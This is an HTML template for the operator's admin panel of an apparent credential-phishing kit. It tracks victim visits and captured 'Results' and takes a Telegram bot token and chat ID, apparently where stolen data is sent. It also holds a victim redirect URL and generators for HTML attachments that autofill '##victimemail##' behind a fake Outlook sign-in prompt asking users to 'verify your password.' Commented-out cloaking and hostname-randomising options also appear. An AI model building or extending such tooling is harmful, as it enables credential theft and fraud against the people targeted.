<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel</title>
  <link rel="stylesheet" href="/css/1.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
  <link href="https://cdn.jsdelivr.net/npm/gridjs/dist/theme/mermaid.min.css" rel="stylesheet" />
  <script src="https://kit.fontawesome.com/0f33ad0e50.js" crossorigin="anonymous"></script>
</head>
<body>

  <div class='d-flex'>
    <aside>
      <img src="/img/ample.png" alt="Ample Admin Logo" style='margin-left: 60px;max-width: 100px; max-height: 100px;'>
      <nav>
        <a href="#home" class="parent-link">Dashboard <i class="fa-solid fa-chevron-down"></i></a>
        <ul class="sub-menu ps-0">
          <li><a href="#visits">Visits</a></li>
          <li><a href="#logs">Logs</a></li>
        </ul>
        <a href="#settings">Settings</a>
        <a href="#errors">Errors <span class="{%+ if unread != '0' %}notify{% endif  %}">&nbsp;<span class="error-count">{%+ if unread != "0"%}{{unread}}{% endif  %}</span>&nbsp;</span></a>
        <span class="parent-link">Generate <i class="fa-solid fa-chevron-down"></i></span>
        <ul class="sub-menu ps-0">
          <li><a href="#link">Link</a></li>
          <li><a href="#attachment">Attachment</a></li>
        </ul>
      </nav>
    </aside>

    <main>
      <header>
        <div class="header-left">
          <span><button id="menu" onclick="toggleMenu()"><i class="fa-solid fa-bars"></i></button></span>
        </div>
        <div class="header-right">
          <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAclBMVEXz8/PzUyWBvAYFpvD/ugjz9PX19PXz+fr39fr69vPy9fp5uAAAofD/tgDz3Nji6tfzRADzTBfzmYew0oB/xfH70IDX5/P16tfz5eLo7eHzPADzlICs0Hfh6/N3wvH7znj07eEAnvDzvbPL3q6u1/L43q6vy/leAAABd0lEQVR4nO3cR1IDQRREwcb0SEgj770B7n9FNmhEBL1g8zUs8l2gIi9QKUmSpHs5vPtWFV4uANMwunUD3IyiS7+Jebgdx7bddb63uvt+dKOqIBw/xTaZNsLZc3CEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEjxVuJ7GNfwj7LQjTejcN7noTVu+z4PabgjB1wmumqm50JaAkSX/oLbxmKveiK/zqp8NxHtvx40bMn6dFbKdzgbi81MEdb8LeaRDdqiSsX2Kr541wMXiNjZCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkPCxwuj/0kvb/6V5Gd2hmTqvokulm90HluNrFyhJ0j/rC6N0RI28dGy3AAAAAElFTkSuQmCC' class='profile-pic'>
          <span>{{name}}'s Admin
        </div></span>
      </header>

      <section id="home">
        <div class='page-intro'>
          <h1 class='fs-4'>Dashboard [Mini v1]</h1>

          <span>
            <button id="reset-btn">Reset Logs and Visits</button>
            <button id="logout-btn">Log Out</button>
          </span>
        </div>

        <div class='page-content'>
          <div class="cards-container">
            <div class="card">
            <h2>Total Visits</h2>
            <p>{{visit_count}}</p>
          </div>

          <div class="card">
            <h2>Total Logs</h2>
            <p>{{logs_count}}</p>
          </div>
            <div class="card">
              <h3>Visit Distribution</h3>
              <div class="chart-container">
                <canvas id="visit-distribution"></canvas>
                </span>
              </div>

            </div>

            <div class="card">
              <h3>Results Distribution</h3>
              <div class="chart-container">
                <canvas id="results-distribution"></canvas>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section id="logs">
        <div id="results-chart-container" class="results-chart-container">
          <canvas id="results-data"></canvas>
        </div>
        <div class="result-wrapper">
          <span>
            Results
          </span>

          <div id="results-data-container" class='d-flex flex-column gap-3 mt-4'>

          </div>
        </div>
      </section>

      <section id="visits">
        <canvas id="map" class='my-4'></canvas>

        <div id="table"></div>
      </section>

      <section id="settings">
        <div class="bg-white rounded container-fluid">
          <form id="settings-form">
          	<h2 style="margin-bottom: 50px;">Last Updated: {{date|escape}}</h2>
            <div style="background-color: #bba5a5;padding: 30px;margin-bottom: 30px;">
            	   <p>Your user settings here here</p>
           		   <label for="user_name">Name</label>
           		   <input type="text" name="user_name" placeholder="Name to appear on panel as owner" id="user_name" value="{{name | escape}}" required>

           			<label for="password">Password</label>
            		<input type="password" name="password" placeholder="Admin Password here" id="password">

           		    <label for="api-key">API KEY</label>
            		<input type="text" placeholder="Api key here" name="api-key" id="api-key">
            		
            		<label for="redirect-url">Redirect Url</label>
            		<input type="text" placeholder="Final destination to redirect user to" name="redirect-url" id="redirect-url" value="{{finish | escape}}" required>
					
					<!-- <div class="form-check form-switch" style="padding: 10px;padding-left: 40px;"> -->
 						 <!-- <input class="form-check-input" type="checkbox" id="randomise"> -->
 						 <!-- <label class="form-check-label" for="randomise">Randomise Hostname</label> -->
					<!-- </div> -->

			</div>
			<div style="background-color:#9ba89b;padding: 30px;">
 				 <p>Your telegram info here</p>
				 <label for="bot-token">BOT TOKEN</label>
           		 <input type="text" placeholder="Telegram's bot token" name="bot-token" id="bot-token" value="{{bot | escape}}" required>
            
          		  <label for="chat-id">Chat ID</label>
           		  <input type="text" placeholder="Telegram's Chat id" name="chat-id" id="chat-id" value="{{chat | escape}}" required>
            </div>
            
           <!-- 
 <div style="background-color:#9ba89b;padding: 30px;">
 				 <p>Other settings</p>
				 <label for="bot-token">Cloak Content</label>
           		 <textarea type="text" name="bot-token" id="bot-token">
            
          		  <label for="chat-id">Chat ID</label>
           		  <input type="text" name="chat-id" id="chat-id">
            </div>
 -->
           

            <button type="submit">Update Profile</button>
          </form>
        </div>
      </section>
	  <section id="errors">
	  	<div id="error-container">
	  		
	  	</div>
	  </section>
      <section id="link" style="position: relative;">
        <div class="warning">
          <div style="padding: 20px; width: fit-content; margin: 0 auto; display: flex; flex-direction: column; align-items: center; background-color: red;">
            <!-- the warning content -->
              <h3>
                <i class="fas fa-times"> </i>This is discontinued for now
              </h3>
          </div>
        </div>
        <div class="bg-white rounded container-fluid">
          <form id="generate-link" class="d-flex flex-column">
            <h3>Generate Link Based Page</h3>
            <p>Automatically Generates Link Based Page For You</p>

            <label for="link-autograbs">Your preferred link autograbs [Seperated with comma, You can add more]</label>
            <input type="text" id="link-autograbs" name="link-autograbs" placeholder="em,email,add">

            <button type="submit" disabled>Generate</button>
          </form>
        </div>
      </section>

      <section id="attachment">
        <div class="bg-white rounded container-fluid">
          <form id="generate-attachment" class="d-flex flex-column">
            <h3>Generate Html Attach</h3>
            <p>Automatically Generates Html Attachment</p>

            <!-- 
<label for="color">Select background</label>
            <input type="color" name="color" id="color-input" value="#ffffff">
 -->

            <label for="att-auto" class='mt-2'>Add Autograb [Put your sender's autograb here, Leave empty for no autograb]</label>
            <input name="att-auto" id="att-auto" type="text" placeholder="##victimemail##"></input>

            <div id="more-options">
              <label for="main-page-background">Change Main page Background [Leave empty for default]</label>
              <input type="text" id="main-page-background" name="main-page-background" placeholder="https://link.com/image.png" class="mb-2">
              <label for="main-page-title">Change Main Page Title [Leave empty for default]</label>
              <input type="text" id="main-page-title" name="main-page-title" placeholder="Sign in into Outlook" class="mb-2">
              <label for="main-red-caption">Change Main red caption [Leave empty for default]</label>
              <input type="text" id="main-red-caption" name="main-red-caption" placeholder="Because you're accessing sensitive info, you need to verify your password" class="mb-2">
            </div>

            <button type="submit">Generate</button>
          </form>
        </div>
      </section>
      <div id='pop-up-details' class='pop-up-container'>
        <div class='pop-up-container-content'>
          <div class='pop-up-container-main-content'>
            <div id='pop-up-content' class='pop-up-content'>
              <h1></h1>
              <p></p>
            </div>
          </div>
        </div>
    </main>
    <input id="copy-main" type="hidden"></input>
  </div>
  <div id="toast" style="visibility: hidden;width: 400px;height: 40px;border: none;position: sticky;bottom: 60px;margin: 0 auto;left: 0;right: 0;background-color: #b9afaf;border-radius: 20px;/*! display: ; */text-align: center;line-height: 37px;">
    	<i id="close-toast" class="fa fa-close" aria-hidden="true" style="float: left;"></i>
    	<span style="color: darkred;" id="toast-content">Toast content</span>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://unpkg.com/chart.js@4"></script>
  <script src="https://unpkg.com/chartjs-chart-geo@4"></script>
  <script src="https://cdn.jsdelivr.net/npm/gridjs/dist/gridjs.umd.js"></script>
  <script src="/js/1.js"></script>
  <script>
  	const rdctx = document.getElementById('results-distribution');
	const vdctx = document.getElementById('visit-distribution');
	
	{
	//results distribution scope
	let labels = {{type_id | safe}};
    let data = {{type_count}};
    new Chart(rdctx, {
      type: 'pie',
      data: {
        labels: !!labels.length ? labels : ["None"],
        datasets: [{
          label: 'Results distribution',
          data: !!data.length ? data : [100],
          backgroundColor: [
            'rgb(255, 99, 132)',
            'rgb(54, 162, 235)',
            'rgb(255, 205, 86)'
          ],
          hoverOffset: 4
        }]
      }
    });
    }
    
    // visit distribution chart data
    {
    //chart's scope
    let labels = {{visit_keys | safe}};
    let data = {{visit_values}};
    new Chart(vdctx, {
      type: 'pie',
      data: {
        labels: !!labels.length ? labels : ["None"],
        datasets: [{
          label: 'Visit distribution',
          data: !!data.length ? data : [100],
          backgroundColor: [
            'rgb(54, 162, 235)',
          ],
          hoverOffset: 4
        }]
      }
    });
    }
    // <!-- maps -->
    fetch('https://unpkg.com/us-atlas/states-10m.json').then((r) => r.json()).then((us) => {
      const nation = ChartGeo.topojson.feature(us, us.objects.nation).features[0];
      const states = ChartGeo.topojson.feature(us, us.objects.states).features;
      const chart = new Chart(document.getElementById("map").getContext("2d"), {
        type: 'choropleth',
        data: {
          labels: states.map((d) => d.properties.name),
          datasets: [{
            label: 'States',
            outline: nation,
            data: states.map((d) => ({
              feature: d,
              value: Math.random() * 10
            })),
          }]
        },
        options: {
          plugins: {
            legend: {
              display: false
            },
          },
          scales: {
            projection: {
              axis: 'x',
              projection: 'albersUsa'
            },
            color: {
              axis: 'x',
              quantize: 5,
              legend: {
                position: 'bottom-right',
                align: 'bottom'
              },
            }
          },
        }
      });
    });
  </script>
</body>
</html>